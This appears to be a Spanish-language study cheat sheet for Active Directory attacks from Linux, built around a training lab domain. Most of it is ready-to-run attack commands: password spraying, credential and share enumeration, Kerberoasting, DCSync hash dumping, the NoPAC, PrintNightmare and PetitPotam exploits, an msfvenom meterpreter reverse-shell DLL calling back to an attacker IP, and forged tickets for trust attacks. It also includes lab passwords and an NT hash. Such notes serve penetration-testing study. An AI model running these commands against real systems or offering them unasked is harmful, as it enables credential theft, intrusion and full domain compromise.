        #### ACTIVE DIRECTORY ENUMERATION & ATTACKS  
Enumeracion: La enumeracion se encuentra fuera de esta carpeta en el txt de AD
En este txt se encuentra como usar tools y tecnicas en un entorno AD desde una maquina Linux

----------      ----------      ----------      ----------
        ### Password spraying: Enumerar usuarios y politicas
Consta del intento de loguearse a un servicio mediante el uso de una contraseña pero una larga lista de usuarios

Para realizar este ataque correctamente priomero se necesita:
-> Listado valido de usuarios de dominio
-> Poliotica de contraseñas de la empresa

----------
## Obtener politica de contraseñas Linux
crackmapexec smb 172.16.5.5 -u <usuario valido> -p <contraseña valida> --pass-pol
#Enumeracion de politica de contraseñas con credenciales validas

rpcclient -U "" -N 172.16.5.5
getdompwinfo
#Enumeracion de la politica de contraseñas sin credenciales validas pero con null sesion

enum4linux -P 172.16.5.5
#Tool de enumeracion el cual prueba diferentes sesiones, busca politicas de contraseñas, etc.
enum4linux-ng -P 172.16.5.5 -oA ilfreight
#Escrito en python. Este permite exportar la data

ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
#En configuraciones viejas de ldap es posible retrive data sin auth. De esta forma se soliciat la politica de pwd

----------  ----------  ----------  ----------
        ### Password Spraying from Linux
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
#One liner en bash para hacer passworrd sprying usando rpcclient y la lista obtenida de usuarios

kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
#Password sprying con kerbrute usando lista de usr validos

sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
#Password srpying con crackmap exec filtrado por lo valido (+) uusando lista de us validos

## Verificacion de credencialees
sudo crackmapexec smb 172.16.5.5 -u <usuario> -p <Pass encontrada>
#Verificacion de usuarios y contraseñas validas mediante crackmapexec

## Local Admin Spraying with CrackMapExec
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
#Si tenemos el hash NT de un admin de cuenta local (no dominio). Es recomendable verificar dicho hash en toda la subnet con la flag --loca-auth para que el tool solo intente logearse 1 vez en cada maquina
#Tecnica muy ruidosa. Cuidado

----------  ----------  ----------  ----------
En este punto, ya con foothold en el sistema, hay que enumerar a profundidad con las credenciales obtenidas

        ### Enumeracion de credenciales from Linux
Cheatsheet de tools: https://wadcoms.github.io/

----------
##Crackmapexec
sudo crackmapexec smb 172.16.5.5 -u <usr valido> -p <pwd valida>
--users
#Con credenciales y la flag --user se puede enumerar usuarios de dominio en el sistema
--group
#Esta flag nos sirve para, nuevamente con credenciales validas, obtener la informacion de los grupos de dominio
--loggedon-users
#Igual que el primero pero enumerando los usuarios logueados en el sistema
--shares
#Permite enumerar los directorios con el respectivo permiso
        -M spider_plus --share 'Directorio'
        #Esto permite enumerar en profundidad el dirtectorio y listar el contenido del mismo.
        #El output es exportado en /tmp/cme_spider_plus/

----------
##SMBmap
-u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
#Permite enumerar los shares con los respectivos permiosos
-R 'Directorio' --dir-only
#Estas flags permiten enumerar el direrctorio especificado en profundiad y con la flag --dir-only se pide el listado solo de directorios.

----------
##Rpcclient 
#([!] Mas info en txt attacking_rpc)

----------
##Impacket
Psexec.py
#Es un clon del tool sysinternals psexec. Crea un servicio mediante la subida de un ejecutable al dir ADMIN$, lo registra mediante RPC y windows control manager y, una vez establecida la comunicacion, genera una shell
psexec.py inlanefreight.local/<usrr>:'<pwd>'@172.16.5.125
#Sintaxis para el uso con credenciales. Genera shell en system32 dir

wmiexec.py
#Utiliza un shell semi interactiva ejecutando comandos mediante Windows management instrumentation. No sube archivos al sistema generando menos logs que otros modulos de impacket
wmiexec.py inlanefreight.local/<usrr>:'<pwd>'@172.16.5.125
#Sintaxis para el uso con credenciales

windapsearch.py
#Script de python que permite la enumeracion de usuraios, grupos y maquinas en un dominio Windows utilizando queries de LDAP
python3 windapsearch.py --dc-ip 172.16.5.5 -u <usr>@inlanefreight.local -p <pwd> --da
#La flag --da sirve para la enumeracion de miembros en el grupo domain admins
-PU
#Esta flag sirve para la enumeracion de usuarios con privilegios elevados

Bloodhound.py
https://github.com/fox-it/BloodHound.py
#Tool que permite enumerar AD mas en profundidad que los anteriores desde windows o linux
bloodhound-python -u '<usr>' -p '<pwd>' -ns 172.16.5.5 -d inlanefreight.local -c all
#-c (o --collectionmethod) permite usar distintos metodos de coleccion de datos como grupos, localadmin, sesiones, etc (ver help para mas info)
#-ns especifica la ip del DC
#-d especifica el nombre del DC
sudo neo4j start
#Esto activa el servicio para usar el tool BloodHound GUI. Permite subir los archivos que se crearon luego de enumerar el dominio para que nos represente de forma grafica la composision de este.
        Find Shortest Paths To Domain Admins
        #Se puede correr queries como la anterior que permite generar un mapa del dominio el cual muestra el camino para comprometerlo

----------  ----------  ----------  ----------
        ### Kerberoasting desde Linux
##GetUserSPNs.py
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/<user to login>
#Muestra cuentas con SPN
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/<user to login> -request
#Hace request para mostrar los TGS
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/<user to login> -request-user <user TGS>
#Hacer request para obtener el TGS de X usuario
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/<user to login> -request-user <user TGS> -outpuitfile <name>
#Output a un file

----------  ----------  ----------  ----------
	### DCSync
Version windows es "From_windows" directory

Es una tecnica que intenta roban la contraseña de la base de datos de AD mediante Directory Replication Service Remote Protocol que es usado por el dominio para replicar la info de este.
La idea es que el DC nos brinde los hashes NTLM
Se necesita cuenta de usuario con privilegios: Replicating Directory Changes and Replicating Directory Changes All permissions set

##Impacket secretdump
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/<user>@172.16.5.5 
#Podemos usar secrets dump de impacket para obtener los hashes NTLM del usuario

Flags interesantes
-just-dc-ntlm
#Si nos interesa solo obtener el hash NTLM
-just-dc-user <USERNAME>
#Si nos interesa solo obtener la dataa de un usuario en particular
-pwd-last-set
#Cuando fue el ultimo cambio de la contraseña
-history
#Para obtener el historial de contraseñas
-user-status
#Nos permite saber si el usuario esta habilitado

----------  ----------  ----------  ----------
	###Bliding eye
Vulnerabilidades criticas ya parcheadas recientemente pero que pueden no estar parcheadas en todos los casos
----------
	### NoPAC / SAMAccount name spoofing
CVE 2021-42278 y 2021-42287
Este ataque consta de agregar una computador de dominio con el nombre (SAMAccount name) del DC. Esto genera que al solicitar kerberos tickets, se nos proporcionen bajo el nombre del DC.

git clone https://github.com/SecureAuthCorp/impacket.git
python setup.py install 
git clone https://github.com/Ridter/noPac.git
#Este ultimo es el tool para explotar la vulnerabilidad. EL repo anterior es de impacket, solo para estar seguros de que esta instalado puesto que nopac lo utiliza.

sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
#Scaneamos el target conectandonos con un usuario valido y especificando la ip.
#Nos obtiene el tgt

sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
#Impersonar al administrador local. Puede ser ruidoso.
#Es una shell semi interactiva mediante smbexec.py de impacket

sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
#Ataque DCSync con nopac

----------
	### Print Nightmare
CVE-2021-34527 and CVE-2021-1675
Vulnerabilidad que esplota el servicio Print Spooler que corre en todos los windows.

git clone https://github.com/cube0x0/CVE-2021-1675.git
#Clonacion del exploit

pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
#Posiblemente haya que usar la version cube0x0 de impacket y desintalar la otra.

rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
#Verificar si Print System Asynchronous Protocol and Print System Remote Protocol estan expuestos en el target

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
#Creacion de DLL para usar el exploit
sudo smbserver.py -smb2support CompData ./backupscript.dll
#Comparto el dll mediante smb

sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
#Corro el exploit

----------
	### PetitPotam
CVE-2021-36942
Vulnerabilidad LSA spoofing. Obliga al DC a autenticarse mediante 445 usando NTLM mediante LSARPC.

sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
#Comienza servidor

git clone https://github.com/topotam/PetitPotam.git
#Clonacion del tool
python3 PetitPotam.py 172.16.5.225 172.16.5.5
#Explotar vuln

python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <base64 cert> dc01.ccache
#Usando el certificado que genera el exploit obtengo el TGT

export KRB5CCNAME=dc01.ccache
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
#Me devuelve el NTLM

---------- ---------- ---------- ----------
	### Domain Trusts - Child
[!] En este caso, el child domain al cual tenemos acceso y controlamos es el logistics.inlanefreight.local

secretsdump.py logistics.inlanefreight.local/<usuario_valido>@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
#Permite obtener el hash NTLM de la cuenta krbtgt
lookupsid.py logistics.inlanefreight.local/<usuario valido>@172.16.5.240 | grep "Domain SID"
#Obtengo el SID del child domain
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
#Obtengo el SID del grupo de admins
ticketer.py -nthash <krbtgt hash> -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid <sid del child dominio> -extra-sid <sid del grupo domain admin> <usuario a crear>
#Obtengo el ticket
export KRB5CCNAME=hacker.ccache
#Almaceno el ticket en cache
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/<usuario creado>@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
#Obtengo shell como el usuario siendo domain admin

----------
        ### Attacking Domain Trusts - Cross-Forest
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
#Con un usuario valido para el dominio objetivo, podemos relquestear el SPN de usuarios
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
#Agregando la flag -request obtenemos el tgs del usuario del cual sacamos el SPN
#Una vez obtenido se puede crackear y usar

domain INLANEFREIGHT.LOCAL
#Se agrega el dominio a /etc/resolv.conf
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
#Para hacer lo mismo con bloodhound usamos el comando de arriba.
zip -r ilfreight_bh.zip *.json
#Comprimirmos los archivos
domain FREIGHTLOGISTICS.LOCAL
#Agregamos el otro dominio al file /etc/resolv.conf
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
#Ejecutamos bloodhound nuevamente y podemos correr el comando 'Users with Foreign Domain Group' para obtener los usuarios

